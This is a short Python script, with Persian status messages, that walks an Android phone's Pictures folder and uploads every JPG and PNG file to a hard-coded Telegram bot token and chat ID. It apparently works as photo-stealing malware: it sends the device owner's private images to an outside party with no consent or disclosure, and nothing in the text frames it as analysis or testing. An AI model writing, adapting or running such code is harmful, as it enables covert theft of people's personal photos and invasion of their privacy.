import os
import requests

def send_photos():
    gallery_path = '/storage/emulated/0/Pictures'
    if not os.path.exists(gallery_path):
        print(f"پوشه {gallery_path} وجود ندارد.")
        return
        
    for filename in os.listdir(gallery_path):
     if filename.endswith('.jpg') or filename.endswith('.png'):
            with open(os.path.join(gallery_path, filename), 'rb') as photo:
                files = {'photo': photo}
                response = requests.post(
                    f"https://api.telegram.org/bot7272002757:AAFvSte6VV1uCCKya7T2cp7FyLflykewv7w/sendPhoto",
                    data={'chat_id': '7643723650'},
                    files=files
                )
                print(response.json())

send_photos()
